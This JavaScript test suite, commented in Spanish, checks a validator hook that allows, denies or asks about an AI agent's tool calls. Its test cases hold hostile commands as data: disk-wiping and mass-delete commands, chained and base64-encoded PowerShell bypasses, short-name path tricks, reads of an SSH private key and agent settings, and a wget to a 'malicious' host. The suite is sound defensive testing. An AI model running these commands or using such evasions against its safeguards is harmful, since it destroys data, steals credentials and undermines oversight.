/**
 * Automated Test Suite for Antigravity Security Harness
 * Tests end-to-end execution of .agents/scripts/validate_command.js
 */

const { spawn } = require('child_process');
const path = require('path');

const VALIDATOR_PATH = path.resolve(__dirname, 'validate_command.js');

function runValidator(payload) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [VALIDATOR_PATH], {
      stdio: ['pipe', 'pipe', 'pipe']
    });

    let stdout = '';
    let stderr = '';

    child.stdout.on('data', (d) => { stdout += d; });
    child.stderr.on('data', (d) => { stderr += d; });

    child.on('close', (code) => {
      if (code !== 0 && !stdout) {
        return reject(new Error(`Validator failed with code ${code}: ${stderr}`));
      }
      try {
        const json = JSON.parse(stdout.trim());
        resolve(json);
      } catch (err) {
        reject(new Error(`Invalid JSON from validator: "${stdout}" (Error: ${err.message})`));
      }
    });

    child.stdin.write(JSON.stringify(payload));
    child.stdin.end();
  });
}

const testCases = [
  // ==========================================
  // a) Comandos legítimos de desarrollo -> allow
  // ==========================================
  {
    category: 'a) Comandos legítimos de desarrollo',
    name: 'npm test',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'npm test', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'allow'
  },
  {
    category: 'a) Comandos legítimos de desarrollo',
    name: 'pytest',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'pytest', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'allow'
  },
  {
    category: 'a) Comandos legítimos de desarrollo',
    name: 'cargo build',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'cargo build', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'allow'
  },
  {
    category: 'a) Comandos legítimos de desarrollo',
    name: 'git status',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'git status', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'allow'
  },

  // ==========================================
  // b) Comandos destructivos -> deny
  // ==========================================
  {
    category: 'b) Comandos destructivos',
    name: 'rmdir /s /q test',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'rmdir /s /q test', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'b) Comandos destructivos',
    name: 'format c:',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'format c:', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'b) Comandos destructivos',
    name: 'diskpart',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'diskpart', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'b) Comandos destructivos',
    name: 'del /s /f *.*',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'del /s /f *.*', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },

  // ==========================================
  // c) Intentos de bypass por encadenamiento -> deny
  // ==========================================
  {
    category: 'c) Bypass por encadenamiento',
    name: 'echo ok ; Remove-Item Fotos*',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'echo ok ; Remove-Item Fotos*', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'c) Bypass por encadenamiento',
    name: 'echo ok && rmdir /s /q dist',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'echo ok && rmdir /s /q dist', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'c) Bypass por encadenamiento',
    name: 'git status | Remove-Item Fotos*',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'git status | Remove-Item Fotos*', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'c) Bypass por encadenamiento',
    name: 'echo test & Remove-Item FOTOSF~1',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'echo test & Remove-Item FOTOSF~1', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },

  // ==========================================
  // d) Intentos de bypass por Base64 / EncodedCommand -> deny
  // ==========================================
  {
    category: 'd) Bypass por Base64 / EncodedCommand',
    name: 'powershell -enc aWYoLi4u',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'powershell -enc aWYoLi4u', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'd) Bypass por Base64 / EncodedCommand',
    name: 'powershell -EncodedCommand JABh...',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'powershell -EncodedCommand JABh...', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'd) Bypass por Base64 / EncodedCommand',
    name: 'pwsh -enc aWYoLi4u',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'pwsh -enc aWYoLi4u', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'd) Bypass por Base64 / EncodedCommand',
    name: 'powershell.exe -e aWYo...',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'powershell.exe -e aWYo...', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },

  // ==========================================
  // e) Manipulación de Cwd -> deny
  // ==========================================
  {
    category: 'e) Manipulación de Cwd',
    name: 'Cwd pointing to Fotos Familia',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'dir', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy\\Fotos Familia' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'e) Manipulación de Cwd',
    name: 'Cwd relative to Fotos Familia',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'ls', Cwd: 'Fotos Familia' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'e) Manipulación de Cwd',
    name: 'Cwd pointing to videos grandes de mi celu',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'dir', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy\\videos grandes de mi celu' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'e) Manipulación de Cwd',
    name: 'Cwd pointing to C:\\Windows\\System32',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'dir', Cwd: 'C:\\Windows\\System32' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'e) Manipulación de Cwd',
    name: 'Cwd pointing to .ssh',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'dir', Cwd: 'C:\\Users\\thehe\\.ssh' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'e) Manipulación de Cwd',
    name: 'Cwd pointing to .gemini',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'dir', Cwd: 'C:\\Users\\thehe\\.gemini' }
      }
    },
    expected: 'deny'
  },

  // ==========================================
  // f) Lectura de archivos personales o credenciales vía view_file -> deny
  // ==========================================
  {
    category: 'f) Lectura de archivos personales / credenciales (view_file)',
    name: 'view_file on Fotos Familia/recuerdos.jpg',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\documents\\Augus-agy\\Fotos Familia\\recuerdos.jpg' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'f) Lectura de archivos personales / credenciales (view_file)',
    name: 'view_file on videos grandes de mi celu/clip.mp4',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\documents\\Augus-agy\\videos grandes de mi celu\\clip.mp4' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'f) Lectura de archivos personales / credenciales (view_file)',
    name: 'view_file on DOS 8.3 FOTOSF~1/secret.txt',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\documents\\Augus-agy\\FOTOSF~1\\secret.txt' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'f) Lectura de archivos personales / credenciales (view_file)',
    name: 'view_file on .ssh/id_rsa',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\.ssh\\id_rsa' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'f) Lectura de archivos personales / credenciales (view_file)',
    name: 'view_file on .gemini/antigravity-cli/settings.json',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\.gemini\\antigravity-cli\\settings.json' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'f) Lectura de archivos personales / credenciales (view_file)',
    name: 'view_file on C:\\Windows\\System32\\cmd.exe',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Windows\\System32\\cmd.exe' }
      }
    },
    expected: 'deny'
  },

  // ==========================================
  // g) Lectura de archivo normal del proyecto vía view_file -> allow
  // ==========================================
  {
    category: 'g) Lectura de archivo de proyecto (view_file)',
    name: 'view_file on package.json',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\documents\\Augus-agy\\package.json' }
      }
    },
    expected: 'allow'
  },
  {
    category: 'g) Lectura de archivo de proyecto (view_file)',
    name: 'view_file on .agents/hooks.json',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\documents\\Augus-agy\\.agents\\hooks.json' }
      }
    },
    expected: 'allow'
  },
  {
    category: 'g) Lectura de archivo de proyecto (view_file)',
    name: 'view_file on src/index.js',
    payload: {
      toolCall: {
        name: 'view_file',
        args: { AbsolutePath: 'C:\\Users\\thehe\\documents\\Augus-agy\\src\\index.js' }
      }
    },
    expected: 'allow'
  },

  // ==========================================
  // h) Comandos desconocidos / de red -> ask
  // ==========================================
  {
    category: 'h) Comandos desconocidos o de red',
    name: 'curl https://example.com',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'curl https://example.com', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'ask'
  },
  {
    category: 'h) Comandos desconocidos o de red',
    name: 'wget https://malicious.com/script.sh',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'wget https://malicious.com/script.sh', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'ask'
  },
  {
    category: 'h) Comandos desconocidos o de red',
    name: 'Invoke-WebRequest https://api.service.com',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'Invoke-WebRequest https://api.service.com', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'ask'
  },
  {
    category: 'h) Comandos desconocidos o de red',
    name: 'unrecognized_tool --action sync',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'unrecognized_tool --action sync', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'ask'
  },

  // ==========================================
  // Evasiones adicionales (Inline code, Wildcards) -> deny
  // ==========================================
  {
    category: 'Evasiones inline / Wildcards',
    name: 'node -e "process.exit(1)"',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'node -e "process.exit(1)"', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'Evasiones inline / Wildcards',
    name: 'python -c "import os; os.system(\'ls\')"',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'python -c "import os; os.system(\'ls\')"', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  },
  {
    category: 'Evasiones inline / Wildcards',
    name: 'Get-ChildItem *Familia*',
    payload: {
      toolCall: {
        name: 'run_command',
        args: { CommandLine: 'Get-ChildItem *Familia*', Cwd: 'C:\\Users\\thehe\\documents\\Augus-agy' }
      }
    },
    expected: 'deny'
  }
];

async function runTestSuite() {
  console.log('======================================================================');
  console.log('           BATERÍA DE PRUEBAS DE SEGURIDAD (TEST HARNESS)             ');
  console.log('======================================================================\n');

  let passedCount = 0;
  let failedCount = 0;
  let currentCategory = '';

  for (let i = 0; i < testCases.length; i++) {
    const tc = testCases[i];
    if (tc.category !== currentCategory) {
      currentCategory = tc.category;
      console.log(`\n--- [ ${currentCategory} ] ---`);
    }

    try {
      const response = await runValidator(tc.payload);
      const isMatch = response.decision === tc.expected;

      if (isMatch) {
        passedCount++;
        console.log(`  [PASS] #${i + 1} ${tc.name} -> Decision: "${response.decision}"`);
      } else {
        failedCount++;
        console.log(`  [FAIL] #${i + 1} ${tc.name}`);
        console.log(`         Esperado: "${tc.expected}", Obtenido: "${response.decision}"`);
        if (response.reason) console.log(`         Razón: ${response.reason}`);
      }
    } catch (err) {
      failedCount++;
      console.log(`  [ERROR] #${i + 1} ${tc.name} -> Excepción: ${err.message}`);
    }
  }

  console.log('\n======================================================================');
  console.log('                         RESUMEN DE PRUEBAS                          ');
  console.log('======================================================================');
  console.log(`Total de pruebas: ${testCases.length}`);
  console.log(`Exitosas (PASS) : ${passedCount}`);
  console.log(`Fallidas (FAIL) : ${failedCount}`);
  console.log(`Resultado final : ${failedCount === 0 ? 'TODO APROBADO (100% OK)' : 'HAY FALLOS DE SEGURIDAD'}`);
  console.log('======================================================================\n');

  if (failedCount > 0) {
    process.exit(1);
  }
}

runTestSuite();
